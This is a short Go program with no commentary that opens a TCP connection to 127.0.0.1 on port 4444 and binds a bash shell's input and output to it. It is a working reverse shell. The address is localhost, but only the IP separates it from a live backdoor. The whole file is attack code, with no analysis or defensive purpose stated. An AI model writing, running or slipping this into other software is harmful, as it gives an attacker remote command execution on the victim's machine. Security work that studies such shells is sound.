package main

import (
	"fmt"
	"os/exec"
	"net"
)

func main(){

	var ip string = "127.0.0.1";
	var port int = 4444;

	socket := fmt.Sprintf(ip+":%d",port)

	c ,_ := net.Dial("tcp",socket)

	cmd := exec.Command("bash")

	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c

	cmd.Run()
}
